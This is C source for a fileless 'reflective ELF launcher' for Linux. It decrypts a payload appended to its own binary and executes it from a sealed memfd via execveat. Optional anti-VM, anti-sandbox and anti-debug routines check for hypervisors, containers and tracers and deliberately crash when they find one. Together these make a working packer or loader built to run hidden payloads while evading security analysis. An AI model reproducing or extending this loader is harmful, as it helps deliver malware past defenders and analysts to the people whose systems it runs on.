/*=======================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 18
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 14.08.2026
//     PROJECT  : REFLECTIVE-ELF-LAUNCHER
//     PLATFORM : LINUX x86_64
/*=======================================*/




/* GitHub: https://github.com/vk-candpython/elflhr


REQUIREMENTS (
    Сompiler : GCC
    Support  : Linux x86_64 (ELF64)
)


https://github.com/vk-candpython/elflhr/blob/main/lindef.h

INTERNAL DECLARATIONS */
#include "lindef.h"




/* Compile-time validation of feature flags */

#define _FLAG_IS_BOOLEAN(flg) _Static_assert(                     \
    ((flg) == FALSE) || ((flg) == TRUE),                          \
    "Build flag: '" #flg "', must be either (FALSE) or (TRUE)"    \
)


_FLAG_IS_BOOLEAN(  USING_ANTI_VM       );
_FLAG_IS_BOOLEAN(  USING_ANTI_SANDBOX  );
_FLAG_IS_BOOLEAN(  USING_ANTI_DEBUG    );


#undef _FLAG_IS_BOOLEAN


/* File descriptor I/O and mmap buffer utilities */


DEC_FUNC(BOOLEAN) FullRead(
    const LONG fd,
    BYTE *const buf, const LONG size
) {
    LONG total = 0;

    WHILE_LIKE (total < size) {
        const LONG n = read(fd, buf + total, size - total);
        IF_UNLIKE (n <= 0) return FALSE;
        total += n;
    }
    return TRUE;
}

DEC_FUNC(BOOLEAN) FullWrite(
    const LONG fd,
    CONST_PTR(BYTE) buf, const LONG size
) {
    LONG total = 0;

    WHILE_LIKE (total < size) {
        const LONG n = write(fd, buf + total, size - total);
        IF_UNLIKE (n <= 0) return FALSE;
        total += n;
    }
    return TRUE;
}


#define FREE_MMAP(pAddr, len) do {    \
    IF_LIKE (*(pAddr)) {              \
        munmap(*(pAddr), (len));      \
        *(pAddr) = NULL;              \
    }                                 \
} while (0)




/* Stateful ARX byte mixer (keyed transform + state update) */
#define DEC_BYTE(b, idx, stt, key, msk) ({                \
    const UINT32 _j  =  (*(idx))++;                       \
    const BYTE   _s  =  *(stt);                           \
                                                          \
    const BYTE _k1  =  (key)[(_j * 11) & (msk)];          \
    const BYTE _k2  =  (key)[(_j * 13) & (msk)];          \
    const BYTE _kd  =  ((BYTE)_j - _s) ^ (_k1 + _k2);     \
                                                          \
    const BYTE _x1  =  ~_kd ^ ~(BYTE)(_j >> 7);           \
    const BYTE _m   =  (_x1 >> 3) | (_x1 << 5);           \
    const BYTE _v   =  ((b) ^ _m) - (_s + _k1);           \
    const BYTE _r   =  ((_v >> 2) | (_v << 6));           \
    const BYTE _x2  =  ~_s & _r;                          \
                                                          \
    *(stt)  =  ((_r << (_x1 & 7)) | (_s >> (_x2 & 7)))    \
            +  (~(_k1 - _k2) ^ _kd);                      \
                                                          \
    /* Return decrypt byte */                             \
    _r;                                                   \
})


/* Decode encrypted RLE-compressed data */
DEC_FUNC(BOOLEAN) UnPackDataToMemFd(
    const LONG MemFd,
    RESTR_PTR(const BYTE)       src, const UINT32 srcSz,
    RESTR_PTR(const BYTE) const key, const BYTE   msk
) {
    UINT32 idx = 0;
    BYTE   stt = *key;

    CONST_PTR(BYTE) srcEnd = src + srcSz;

    BYTE DEC_ALIGN_BUF Blk[BLK_SIZE_16KB];
    LONG BlkIdx = 0;


    BOOLEAN oK = TRUE;

    WHILE_LIKE (oK && (src < srcEnd)) {
        const BYTE c = DEC_BYTE(*src++, &idx, &stt, key, msk);

        IF_UNLIKE (c & RLE_FLG_RUN) {
            IF_UNLIKE (src >= srcEnd) return FALSE;

            const BYTE v = DEC_BYTE(*src++, &idx, &stt, key, msk);
            BYTE       l = c & RLE_MAX_RUN;

            WHILE_LIKE (l--) {
                Blk[BlkIdx++] = v;

                IF_UNLIKE (BlkIdx == sizeof(Blk)) {
                    oK     = FullWrite(MemFd, Blk, BlkIdx);
                    BlkIdx = 0;
                }
            }
        }
        else {
            IF_UNLIKE (c > (srcEnd - src)) return FALSE;

            BYTE l = c;

            WHILE_LIKE (l--) {
                Blk[BlkIdx++] = DEC_BYTE(*src++, &idx, &stt, key, msk);

                IF_UNLIKE (BlkIdx == sizeof(Blk)) {
                    oK     = FullWrite(MemFd, Blk, BlkIdx);
                    BlkIdx = 0;
                }
            }
        }
    }
    IF_LIKE (oK && BlkIdx) oK = FullWrite(MemFd, Blk, BlkIdx);


    /* Return unpack status */
    return oK;
}




/* Extracts the appended payload overlay
   from the current process image file */
DEC_FUNC(const BYTE*) ReadOverLay(VOID) {
    /* Initialize with size marker length
       for the initial read */
    UINT32 tlLn = DAT_LEN_SZ;

    BYTE *dtBuf = NULL;
    LONG SelfFd = INVALID_HANDLE;


    CHAR SelfPath[EXE_PROCFS_PATH_LEN];
    EXE_INIT_PROCFS_PATH(SelfPath);

    SelfFd = open(SelfPath, O_RDONLY);
    IF_SYSFAIL (SelfFd) goto _ret;


    /* Get file size and Calculate file offset
       to the beginning of the encrypted data */
    const LONG SelfSz = lseek(SelfFd,
        -(LONG)tlLn, SEEK_END) + sizeof(tlLn);

    /* Read overlay data length directly
       into the length variable */
    IF_UNLIKE (read(SelfFd, &tlLn, tlLn) != sizeof(tlLn))
        goto _ret;


    /* Account for the size marker itself
       and verify bounds */
    tlLn += DAT_LEN_SZ;
    IF_UNLIKE (tlLn > (UINT32)SelfSz) goto _ret;


    /* Allocate mmap buffer
       to hold the complete overlay structure */
    dtBuf = (BYTE*)mmap(NULL, tlLn, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS,
                        INVALID_HANDLE, 0);
    IF_UNLIKE (dtBuf == MAP_FAILED) goto _ret;

    /* Store overlay size at buffer start
       for unpacker parsing */
    *(UINT32*)dtBuf = tlLn;


    /* Reset the file offset
       to the beginning of the complete overlay data */
    lseek(SelfFd, -(LONG)tlLn, SEEK_CUR);

    /* Read the remainder of the payload from disk,
       skipping the total length header slot */
    IF_UNLIKE (!FullRead(SelfFd,
        dtBuf + DAT_LEN_SZ, (LONG)(tlLn - DAT_LEN_SZ))
    ) FREE_MMAP(&dtBuf, tlLn); // dtBuf is assigned NULL

_ret:
    IF_LIKE (SelfFd > INVALID_HANDLE) close(SelfFd);
    return (const BYTE*)dtBuf;
}




/* Launch ELF64 via memfd and execveat */
DEC_FUNC(VOID) ExecImageELF64(
    RESTR_PTR(const VOID) const _rsp,
    RESTR_PTR(const BYTE) ELF_DAT, const UINT32 ELF_DAT_SZ
) {
    const LONG MemFd = memfd_create(
        MFD_NAME, MFD_CLOEXEC|MFD_ALLOW_SEALING);
    IF_SYSFAIL (MemFd) goto _ret;

{//* EXEC
    const     LONG   argc = *(LONG*)_rsp;
    CONST_PTR(CHAR) *argv = (CONST_PTR(CHAR)*)((BYTE*)_rsp + sizeof(argc));
    CONST_PTR(CHAR) *envp = argv + argc + 1;


    const BYTE   ELF_KEY_SZ = *(ELF_DAT + DAT_LEN_SZ);
    const UINT32 ELF_EXE_SZ = ELF_DAT_SZ - (
        (DAT_LEN_SZ + DAT_KEY_SZ) +
        (ELF_KEY_SZ + DAT_LEN_SZ)
    );

    const BYTE
        *ELF_KEY = (BYTE*)(ELF_DAT + (DAT_LEN_SZ + DAT_KEY_SZ)),
        *ELF_EXE = (BYTE*)(ELF_KEY + (ELF_KEY_SZ + DAT_LEN_SZ));


    IF_UNLIKE (!UnPackDataToMemFd(
        MemFd,
        ELF_EXE, ELF_EXE_SZ,
        ELF_KEY, ELF_KEY_SZ - 1 // Key size to mask for power-of-two indexing
    )) goto _ret;

    FREE_MMAP(&ELF_DAT, ELF_DAT_SZ);

    fcntl(MemFd, F_ADD_SEALS, F_SEALS_ALL);
    execveat(MemFd, MFD_NAME, argv, envp, AT_EMPTY_PATH);
}//* EXEC

_ret:
    FREE_MMAP(&ELF_DAT, ELF_DAT_SZ);
    IF_LIKE (MemFd > INVALID_HANDLE) close(MemFd);
    return;
}




/* Anti-VM Engine:
   Returns TRUE if virtual machine is DETECTED */
#if (USING_ANTI_VM)
DEC_FUNC(BOOLEAN) AntiVM(VOID) {
    BOOLEAN is_VM = TRUE;
    LONG PciDirFd = INVALID_HANDLE;

{//* CPUID
    BOOLEAN hypervisor;

    DEC_ASM (
        "movl $1, %%eax\n\t" // 1. Set CPUID function 1 (Processor Info)
        "cpuid\n\t"          // 2. Execute CPUID (fills EAX, EBX, ECX, EDX)
        "btl $31, %%ecx\n\t" // 3. Bit test bit 31 (Hypervisor Present Bit)

        : "=@ccc"(hypervisor)
        : : "rax", "rbx", "rcx", "rdx"
    );

    IF_UNLIKE (hypervisor) goto _ret;
}//* CPUID

{//* HWMON2
    CHAR Hwmon2Path[HWMON2_SYSFS_PATH_LEN];
    HWMON2_INIT_SYSFS_PATH(Hwmon2Path);

    /* Assume VM if hwmon2 is missing,
       Physical systems typically expose
       ACPI, CPU and another HWMON device */
    const LONG Hwmon2Fd = open(Hwmon2Path, O_RDONLY);
    IF_SYSFAIL (Hwmon2Fd) goto _ret;

    close(Hwmon2Fd);
}//* HWMON2

{//* PCIVEN
    CHAR PciPath[PCI_SYSFS_PATH_LEN];
    PCI_INIT_SYSFS_PATH(PciPath);

    PciDirFd = open(PciPath, O_RDONLY|O_DIRECTORY);
    /* Assume VM if PCI directory cannot be opened */
    IF_SYSFAIL (PciDirFd) goto _ret;


    const UINT64 ConfigSuff = PCI_CONFIG_SUFF;
    CHAR CfgPath[PCI_ID_LEN + sizeof(ConfigSuff)];

    CHAR DEC_ALIGN_BUF buf[PCI_BUF_SIZE];
    LONG bln;

    UINT16 vendorID;


    WHILE_LIKE ((bln = getdents64(PciDirFd, buf, sizeof(buf))) > 0)
    {//* while getdents64
    const CHAR     *pCur = buf;
    CONST_PTR(CHAR) pEnd = buf + bln;

    /* Parse directory entries */
    WHILE_LIKE (pCur < pEnd) {
        CONST_PTR(struct linux_dirent64) ent = (struct linux_dirent64*)pCur;

        pCur += ent->d_reclen;

        /* Skip non-matching DBDF sizes */
        IF_UNLIKE (ent->d_reclen < PCI_ID_ENTRY_SZ)
            continue;


        /* Construct PCI device config path,
           Example: "0000:00:00.0/config\0" */
        MEMCPY(CfgPath,              ent->d_name, PCI_ID_LEN        );
        MEMCPY(CfgPath + PCI_ID_LEN, &ConfigSuff, sizeof(ConfigSuff));


        const LONG CfgFd = openat(PciDirFd, CfgPath, O_RDONLY);
        IF_SYSFAIL (CfgFd) continue;

        /* Read Vendor ID from the start of PCI config space */

        read(CfgFd, &vendorID, sizeof(vendorID));
        close(CfgFd);


        /* Match known VM vendor IDs */
        switch (vendorID) {
            case PCI_VENID_VBOX      :
            case PCI_VENID_VMWARE    :

            case PCI_VENID_QEMU      :
            case PCI_VENID_QEMU_BRG  :
            case PCI_VENID_QEMU_VGA  :

            case PCI_VENID_XEN       :
            case PCI_VENID_HYPER_V   :
            case PCI_VENID_PARALLELS :
            /* VM vendor is detected */
                goto _ret;
        }
    }
    }//* end of while getdents64
}//* PCIVEN

/* VM is not detected */
is_VM = FALSE;

_ret:
    IF_LIKE (PciDirFd > INVALID_HANDLE) close(PciDirFd);
    return is_VM;
}
#endif




/* Anti-SandBox Engine:
   Returns TRUE if sandbox is DETECTED */
#if (USING_ANTI_SANDBOX)
DEC_FUNC(BOOLEAN) AntiSandBox(VOID) {
    BOOLEAN is_SANDBOX = TRUE;
    CHAR buf[BUF_SIZE_1KB];

{//* CGROUP1
    CHAR Cgroup1Path[CGROUP1_PROCFS_PATH_LEN];
    CGROUP1_INIT_PROCFS_PATH(Cgroup1Path);

    const LONG Cgroup1Fd = open(Cgroup1Path, O_RDONLY);
    IF_SYSFAIL (Cgroup1Fd) goto _ret;


    /* Read prefix + 1 byte to ensure
       (buf + 1) is always valid */
    read(Cgroup1Fd, buf, sizeof(CGROUP1_SYSTEMD_PREF) + 1);
    close(Cgroup1Fd);


    /* Verify PID 1 cgroup v2 path matches host systemd pattern:
       "::/init." – marks the init.scope reserved for the host is PID 1,
       Any other layout indicates a container runtime */
    IF_UNLIKE (*(UINT64*)(buf + 1) != CGROUP1_SYSTEMD_PREF)
        goto _ret;
}//* CGROUP1

{//* MOUNTS
    CHAR MountsPath[MOUNTS_PROCFS_PATH_LEN];
    MOUNTS_INIT_PROCFS_PATH(MountsPath);

    const LONG MountsFd = open(MountsPath, O_RDONLY);
    IF_SYSFAIL (MountsFd) goto _ret;


    const LONG rd = read(MountsFd, buf, sizeof(buf) - 1);
    close(MountsFd);

    IF_UNLIKE (rd <= 0) goto _ret;
    buf[rd] = '\0';


    BOOLEAN FoundRootFs = FALSE;
    const CHAR *pCurChr = buf;

    WHILE_LIKE (*pCurChr++) {
        const CHAR *nm = pCurChr - 1;

        /* Look for " / " which marks
           the root filesystem mountpoint */
        IF_LIKE (!((nm[1] == '/') && (nm[2] == ' ')))
            continue;

        /* Backtrack to the start of the line to find the device path */
        WHILE_LIKE ((nm > buf) && (nm[-1] != '\n')) --nm;


        /* Check if the device path begins with "/dev" */
        IF_UNLIKE (*(UINT32*)nm != MOUNTS_DEV_PREF)
            goto _ret;

        FoundRootFs = TRUE;
        break;
    }

    /* Fail-closed: missing root */
    IF_UNLIKE (!FoundRootFs) goto _ret;
}//* MOUNTS

/* SANDBOX is not detected */
is_SANDBOX = FALSE;

_ret:
    return is_SANDBOX;
}
#endif




/* Anti-Debug Engine:
   Returns TRUE if debug/anomaly is DETECTED */
#if (USING_ANTI_DEBUG)
DEC_FUNC(BOOLEAN) AntiDebug(VOID) {
    BOOLEAN is_DEBUG = TRUE;

{//* STATUS
    CHAR StatusPath[STATUS_PROCFS_PATH_LEN];
    STATUS_INIT_PROCFS_PATH(StatusPath);

    const LONG StatusFd = open(StatusPath, O_RDONLY);
    IF_SYSFAIL (StatusFd) goto _ret;


    CHAR buf[BUF_SIZE_1KB];

    const LONG rd = read(StatusFd, buf, sizeof(buf) - 1);
    close(StatusFd);

    IF_UNLIKE (rd <= 0) goto _ret;
    buf[rd] = '\0';


    BOOLEAN FoundTpid = FALSE;
    const CHAR *pCurChr = buf;

    WHILE_LIKE (*pCurChr++) {
        /* Match "\n[-1]T[0]racerP[6]id" token at line start */
        IF_UNLIKE (
            (pCurChr[-1] == '\n') &&
            (pCurChr[0]  == 'T' ) && (pCurChr[6] == 'P')
        ) {
            pCurChr += STATUS_TRACERPID_OFFSET_SZ;

            /* Compare with ":\t0\n" to confirm TracerPid is zero */
            IF_UNLIKE (*(UINT32*)pCurChr != STATUS_ZERO_TRACERPID)
                goto _ret;

            FoundTpid = TRUE;
            break;
        }
    }

    /* Fail-closed: missing TracerPid */
    IF_UNLIKE (!FoundTpid) goto _ret;
}//* STATUS

/* DEBUGGER is not detected */
is_DEBUG = FALSE;

_ret:
    return is_DEBUG;
}
#endif




/*
/==================\
 LOADER-ENTRY-POINT
/==================\
*/
_GCC_ATTR(noreturn, visibility("hidden"))
VOID Main(CONST_PTR(VOID) __kernel_rsp) {
#if (USING_ANTI_VM || USING_ANTI_SANDBOX || USING_ANTI_DEBUG)
{//* ANTI-ANALYSIS
    /* VSD - VM, SANDBOX, DEBUG */
    const BOOLEAN DEC_ALIGN_BUF VSD[XMM_REGISTER_SIZE];
    const BOOLEAN *p = VSD; // Single +1 shift breaks alignment


#if (USING_ANTI_DEBUG)
    IF_LIKE (p == VSD) p += AntiDebug();
#endif

#if (USING_ANTI_SANDBOX)
    IF_LIKE (p == VSD) p += AntiSandBox();
#endif

#if (USING_ANTI_VM)
    IF_LIKE (p == VSD) p += AntiVM();
#endif


    /* Misalign pointer (p) on detection -> GP fault */
    DEC_ASM ("movaps %%xmm0, (%0)\n\t"
        : : "r"(p)
        : "memory", "cc", "xmm0"
    );
}//* ANTI-ANALYSIS
#endif

{//* MAIN
    /* Overlay layout
        1: total_len : DAT_LEN_SZ
        2: key_size  : DAT_KEY_SZ
        3: key       : ELF_KEY
        4: raw_len   : DAT_LEN_SZ
        5: payload   : ELF_EXE
    */
    const BYTE *ELF_DAT = ReadOverLay();
    IF_UNLIKE (!ELF_DAT) goto _exit;

    const UINT32 ELF_DAT_SZ = *(UINT32*)ELF_DAT;


    ExecImageELF64(__kernel_rsp, ELF_DAT, ELF_DAT_SZ);
}//* MAIN

_exit: exit_group(EXIT_FAILURE);
}




/*
Kernel Entry Point:
  1. Initialize runtime environment
  2. Transfer control to loader entry point
*/
_GCC_ATTR(naked, noreturn, visibility("hidden"))
VOID _start(VOID) {
    DEC_ASM (
        "movq %%rsp, %%rdi\n\t"       // 1. Save pristine kernel stack (argc/argv/envp/auxv)

        "andq $-16, %%rsp\n\t"        // 2. Force 16-byte alignment
        "subq $8,   %%rsp\n\t"        // 3. ABI alignment for JMP (simulates CALL)

        "leaq Main(%%rip), %%rax\n\t" // 4. Load address of Main relative to RIP
        "jmpq *%%rax\n\t"             // 5. Absolute jump to Main

        : : : "memory", "cc", "rdi", "rax"
    );
    _UNREACHABLE();
}
